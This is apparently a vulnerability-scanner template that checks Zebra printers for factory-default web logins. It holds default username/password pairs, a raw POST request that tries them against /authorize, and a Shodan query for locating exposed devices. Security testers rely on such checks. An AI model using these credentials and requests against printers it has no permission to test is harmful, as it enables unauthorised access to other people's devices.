id: zebra-default-login
info:
  name: Zebra - Default Login
  author: y0no
  severity: high
  description: |
    Zebra default login credentials was discovered.
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Zebra"}) || any(each(service["http.bodies"]), {# matches "Zebra Technologies"})
    max-request: 4
    shodan-query: title:"Zebra"
    verified: true
  tags: default-login,intrusive,misconfig,printer,vuln,zebra
http:
  - attack: pitchfork
    matchers:
      - part: body
        type: word
        words:
          - '>Access Granted. This IP Address now'
      - status:
          - 200
        # digest: 4b0a00483046022100ceb57f5bf1e8f5cfd5c774fac1b3a4c3fc273e9ade1e98e9eaec2dd67584348f022100914483fe1a40ce9f35ec0e82b188c369f7c390e488c2ef45c23a068c15dc6a6c:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    payloads:
      password:
        - ""
        - 1234
      username:
        - 1234
        - admin
    raw:
      - |
        POST /authorize HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        0={{username}}&1={{password}}
